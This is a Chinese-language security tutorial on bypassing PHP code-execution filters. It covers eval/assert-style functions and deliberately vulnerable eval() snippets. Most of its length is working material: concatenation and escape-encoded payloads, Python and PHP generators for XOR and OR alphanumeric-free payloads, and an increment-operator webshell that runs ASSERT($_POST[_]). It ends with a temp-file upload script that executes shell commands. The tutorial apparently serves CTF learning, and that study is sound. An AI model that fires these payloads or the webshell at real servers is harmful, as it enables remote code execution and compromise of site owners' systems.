# PHP安全学习—绕过代码执行过滤

Author: H3rmesk1t

Data: 2021.06.02

# 代码执行函数

PHP中具有代码执行功能的函数

- `eval()`：最常见的代码执行函数，把字符串 code 作为PHP代码执行

```php
eval ( string $code ) : mixed
```
- `assert()`：检查一个断言是否为false
assert()会检查指定的assertion并在结果为false时采取适当的行动，在PHP5或PHP7中，如果assertion是字符串，它将会被assert()当做PHP代码来执行
```php
PHP 5
assert ( mixed $assertion [, string $description ] ) : bool

PHP 7
assert ( mixed $assertion [, Throwable $exception ] ) : bool
```
- `preg_replace()+/e`：执行一个正则表达式的搜索和替换
搜索subject中匹配pattern的部分，以replacement进行替换，如果pattern的模式修饰符使用/e，那么当subject被匹配成功时，replacement会被当做PHP代码执行（preg_replace()+函数的/e修饰符在PHP7中被移除）
```php
preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] ) : mixed
```
- `create_function()`：创建一个匿名（lambda样式）函数
根据传递的参数创建一个匿名函数，并为其返回唯一的名称，如果没有严格对参数传递进行过滤，攻击者可以构造payload传递给create_function()对参数或函数体闭合注入恶意代码导致代码执行

```php
create_function ( string $args , string $code ) : string
```
- `array_map()`：为数组的每个元素应用回调函数
返回数组，是为array每个元素应用callback函数之后的数组，array_map()返回一个array，数组内容为array1的元素按索引顺序为参数调用callback后的结果（有更多数组时，还会传入arrays的元素），callback函数形参的数量必须匹配array_map()实参中数组的数量

```php
array_map ( callable $callback , array $array , array ...$arrays ) : array
```

- `call_user_func()`：把第一个参数作为回调函数调用
第一个参数callback是被调用的回调函数，其余参数是回调函数的参数

```php
call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) : mixed
```
- `call_user_func_array()`：调用回调函数，并把一个数组参数作为回调函数的参数
把第一个参数作为回调函数callback调用，把参数数组作param_arr为回调函数的的参数传入，跟array_map()相似

```php
call_user_func_array ( callable $callback , array $param_arr ) : mixed
```

- `array_filter()`：用回调函数过滤数组中的单元
依次将array数组中的每个值传递到callback函数，如果callback函数返回true，则array数组的当前值会被包含在返回的结果数组中，数组的键名保留不变

```php
array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array
```
- `usort()`：使用用户自定义的比较函数对数组中的值进行排序
本函数将用用户自定义的比较函数对一个数组中的值进行排序，如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数

```php
usort ( array &$array , callable $value_compare_func ) : bool
```
# 字符串拼接绕过
>字符串拼接绕过适用于绕过过滤具体关键字的限制
适用PHP版本：PHP>=7

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
$cmd = $_POST['cmd'];
if (isset($cmd)) {
    if (preg_match('/phpinfo|system/i', $cmd)) {
        die('Hacker!!!Fuck_you!!!');
    }else {
        eval($cmd);
    }
}else {
    echo "Welcome!!!";
}
?>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602153035107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

```
Payload：

(p.h.p.i.n.f.o)();
(sy.(st).em)(whoami);
(sy.(st).em)(who.ami);
(s.y.s.t.e.m)("whoami");
.......
```
# 字符串转义绕过
适用PHP版本：PHP>=7

- 以八进制表示的`\[0–7]{1,3}`转义字符会自动适配byte（如"\400" == “\000”）
- 以十六进制的`\x[0–9A-Fa-f]{1,2}`转义字符表示法（如“\x41"）
- 以Unicode表示的`\u{[0–9A-Fa-f]+}`字符，会输出为UTF-8字符串
>`注意这里转义后的字符必须双引号包裹传参`

```python
处理脚本：

# -*- coding:utf-8 -*-
def hex_payload(payload):
	res_payload = ''
	for i in payload:
		i = "\\x" + hex(ord(i))[2:]
		res_payload += i
	print("[+]'{}' Convert to hex: \"{}\"".format(payload,res_payload))

def oct_payload(payload):
	res_payload = ""
	for i in payload:
		i = "\\" + oct(ord(i))[2:]
		res_payload += i
	print("[+]'{}' Convert to oct: \"{}\"".format(payload,res_payload))

def uni_payload(payload):
	res_payload = ""
	for i in payload:
		i = "\\u{{{0}}}".format(hex(ord(i))[2:])
		res_payload += i
	print("[+]'{}' Convert to unicode: \"{}\"".format(payload,res_payload))

if __name__ == '__main__':
	payload = 'phpinfo'
	hex_payload(payload)
	oct_payload(payload)
	uni_payload(payload)
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021060215431999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602154511761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602154520380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

同时，八进制的方法可以绕过无字母传参进行代码执行

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602154721364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 多次传参绕过
适用PHP版本：无限制
如果过滤了引号(单引号/双引号)，可以通过以下方法绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602155232664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602155238832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

如果PHP版本大于7这里还可以用拼接的方法绕过过滤引号

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021060215535943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

如果碰到参数长度受限制，也可以通过多次传参的方法绕过参数长度限制或者回调函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602155639891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

回调函数可能大部分看限制的具体长度，但是在PHP >= 5.6 & PHP < 7时对以上过滤方法可以绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602160118697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 内置函数访问绕过
适用于PHP版本：Windows本地测试的是PHP>=7可以成功，PHP5测试虽然报错但是并不肯定不能使用
`get_defined_functions()`：返回所有已定义函数的数组
利用这种方法首先还需要知道PHP的具体版本，因为每个版本的get_defined_functions()返回的值都是不一样的，这里以php7.3.4为准

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021060216080145.png#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602160807899.png#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602161219883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602161225556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 异或绕过
适用PHP版本：无限制
例如：我们异或 ? 和 ~ 之后得到的是 A

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602161622238.png#pic_center)

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(preg_match('/[a-z0-9]/is', $_GET['shell'])){
	echo "hacker!!";
}else{
	eval($_GET['shell']);
}
?>
```

```python
异或脚本

# -*- coding: utf-8 -*-
payload = "assert"
strlist = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 58, 59, 60, 61, 62, 63, 64, 91, 93, 94, 95, 96, 123, 124, 125, 126, 127]
#strlist是ascii表中所有非字母数字的字符十进制
str1,str2 = '',''

for char in payload:
    for i in strlist:
        for j in strlist:
            if(i ^ j == ord(char)):
                i = '%{:0>2}'.format(hex(i)[2:])
                j = '%{:0>2}'.format(hex(j)[2:])
                print("('{0}'^'{1}')".format(i,j),end=".")
                break
        else:
            continue
        break
```

一次代码执行只能得到我们想要执行语句的字符串，并不能执行语句，所以需要执行两次代码进行构造
使用脚本对每个字母进行转换，然后拼接

```php
$_=('%01'^'%60').('%08'^'%7b').('%08'^'%7b').('%05'^'%60').('%09'^'%7b').('%08'^'%7c');
//$_='assert';
$__='_'.('%07'^'%40').('%05'^'%40').('%09'^'%5d');
//$__='_GET';
$___=$$__;
//$___='$_GET';
$_($___[_]);
//assert($_GET[_]);
```

Payload：`$_=('%01'^'%60').('%08'^'%7b').('%08'^'%7b').('%05'^'%60').('%09'^'%7b').('%08'^'%7c');$__='_'.('%07'^'%40').('%05'^'%40').('%09'^'%5d');$___=$$__;$_($___[_]);&_=phpinfo();`

>经本地测试，发现这种方法可以在php5以及php7.0.9版本种使用，因为assert()的问题，并不是异或不能使用
其次，PHP5低版本有些可能因为magic_quotes_gpc开启的关系导致无法利用

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602162530266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

当过滤字符的范围没有那么大，或者只是过滤关键字的时候可以使用如下脚本

```python
# -*- coding: utf-8 -*-
import string

char = string.printable
cmd = 'phpinfo'
tmp1,tmp2 = '',''
for res in cmd:
    for i in char:
        for j in char:
            if(ord(i)^ord(j) == ord(res)):
                tmp1 += i
                tmp2 += j
                break
        else:
            continue
        break
print("('{}'^'{}')".format(tmp1,tmp2))
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602163013317.png#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602162947813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
找到一个大师傅的方法
```php
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
//${_GET}{%ff}();&%ff=phpinfo
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602164701956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

fuzz脚本

```python
def r_xor(): 
	for i in range(0,127): 
		for j in range(0,127): 
			result=i^j 
			print(" "+chr(i)+" ASCII:"+str(i)+' <--xor--'+chr(j)+" ASCII:"+str(j)+' == '+chr(result)+" ASCII:"+str(result)) 

if __name__ == "__main__": 
	r_xor()
```
解析：
- 看到代码中的下划线“_”、“__”、“___”是一个变量，因为preg_match()过滤了所有的字母，我们只能用下划线来作变量名
- 这里使用的是 assert($_POST[ _ ]) 在PHP5当中assert()的作用和eval()相似都是执行，但是eval是因为是一个语言构造器而不是一个函数，不能被可变函数调用，所以这种拼接的方法只能用assert而不能用eval，只不过eval()只执行符合php编码规范的代码，同时这里使用变量进行payload拼接，拼接起来

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602164314723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602164556266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 或绕过
生成脚本

```php
<?php
$myfile = fopen("or_rce.txt", "w");
$contents="phpinfo";
for ($i=0; $i < 256; $i++) { 
    for ($j=0; $j <256 ; $j++) { 

        if($i<16){
            $hex_i='0'.dechex($i);
        }
        else{
            $hex_i=dechex($i);
        }
        if($j<16){
            $hex_j='0'.dechex($j);
        }
        else{
            $hex_j=dechex($j);
        }
        $preg = '/[0-9a-z]/i';//根据题目给的正则表达式修改即可
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
                    echo "";
    }
  
        else{
        $a='%'.$hex_i;
        $b='%'.$hex_j;
        $c=(urldecode($a)|urldecode($b));
        if (ord($c)>=32&ord($c)<=126) {
            $contents=$contents.$c." ".$a." ".$b."\n";
        }
    }

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

利用生成的数据构造脚本
```python
# -*- coding: utf-8 -*-
import requests
import urllib
from sys import *
import os
def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("or_rce.txt","r")
       while True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"|\""+s2+"\")"
   return(output)
   
while True:
   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
   print(param)
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602170233796.png#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602170239753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

# URL编码取反绕过
适用PHP版本：无限制

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602163350934.png#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602163356845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602163534793.png#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602163540529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 递增递减运算符绕过

数组（Array）的第一个字母就是大写A，而且第4个字母是小写a，也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母
在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602170700528.png#pic_center)

再取这个字符串的第一个字母，就可以获得`A`了
利用这个技巧，编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是ASSERT($POST[ _ ])，无需获取小写a）

```php
<?php
$_=[]; 
$_=@"$_"; // $_='Array'; 
$_=$_['!'=='@']; // $_=$_[0]; 
$___=$_; // A 
$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; 
$___.=$__; // S 
$___.=$__; // S 
$__=$_; 
$__++;$__++;$__++;$__++; // E 
$___.=$__; 
$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R 
$___.=$__; 
$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__; 
$____='_'; 
$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P 
$____.=$__; 
$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O 
$____.=$__; 
$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__; 
$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__; 
$_=$$____; 
$___($_[_]); // ASSERT($_POST[_]);
```
Payload
注意最后传入的时候记得URL编码一次，密码是_，POST传入 _=phpinfo(); 
这里利用版本是PHP 7.0.12及以下版本

```php
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602173445963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 上传临时文件

上传临时文件[具体原理](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

```python
#coding:utf-8
#author yu22x
import requests
url="http://xxx/test.php?code=?><?=`. /???/????????[@-[]`;?>"
files={'file':'cat f*'}
response=requests.post(url,files=files)
html = response.text
print(html)
```
